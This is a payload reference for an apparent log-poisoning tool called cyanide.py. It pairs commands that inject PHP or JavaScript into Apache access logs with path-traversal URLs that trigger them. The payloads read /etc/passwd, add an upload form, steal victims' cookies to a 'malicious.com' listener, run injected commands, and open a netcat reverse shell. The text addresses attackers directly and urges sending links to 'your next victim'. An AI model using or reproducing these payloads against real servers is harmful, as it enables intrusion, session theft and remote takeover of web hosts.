# Payloads
## Reading Files
<small>PHP • min. 130 characters • 0 arguments</small>

Enables the reading of files in the victim's machine using the *?f=* argument on the logs page. Ex.:

**Poisoning**
```bash
./cyanide.py -pl PHPREADFILE -P page -u https://google.com/
```

**Exploiting**
```url
https://google.com/?page=../../../../../var/log/apache2/access.log&f=/etc/passwd
```

## Uploading Files
<small>PHP • min. 328 characters • 0 arguments</small>

Adds a file upload form to the log page. Ex.:

**Poisoning**
```bash
./cyanide.py -pl PHPUPLOAD -P page -u https://google.com/
```

**Exploiting**
```url
https://google.com/?page=../../../../../var/log/apache2/access.log
<!-- Find the form and input your file. -->
```

## Cookie Stealer
<small>JS • min. 104 characters • 1 arguments</small>

Appends a cookie stealer to the logs page that sends cookies over to a server (listener) of your choice. Send a link to your next victim and get their cookies sent in the request to your server. Ex.:

**Poisoning**
```bash
./cyanide.py -pl JSCOOKIEXSS http://malicious.com/ -P page -u https://google.com/
```

**Exploiting**

Send a link to the logs page to your next victim. Watch your malicous listener and see the cookie appear in the requests!

## Command Injection
<small>PHP • min. 72 characters • 0 arguments</small>

Allows for command injection on the logs page using the *?c=* parameter. Ex.:

**Poisoning**
```bash
./cyanide.py -pl PHPCMD -P page -u https://google.com/
```

**Exploiting**
```url
https://google.com/?page=../../../../../var/log/apache2/access.log&c=whoami
```

## Encoded Command Injection
<small>PHP • min. 102 characters • 0 arguments</small>

Allows for **base64 and URL encoded** command injection on the logs page using the *?b=* parameter. Ex.:

**Poisoning**
```bash
./cyanide.py -pl PHPB64CMD -P page -u https://google.com/
```

**Exploiting**
```url
https://google.com/?page=../../../../../var/log/apache2/access.log&b=d2hvYW1p
```

## Netcat Reverse Shell
<small>PHP • min. 78 characters • 2 arguments</small>

Loading the log page will result into reaching for a reverse shell on a specified IP and port. Ex.:

**Poisoning**
```bash
./cyanide.py -pl PHPREVSHELL 127.0.0.1 4444 -P page -u https://google.com/
```

**Exploiting**

Set a netcat listener on specified port. Ex:. `nc -lvnp 4444`
Reload the logs page
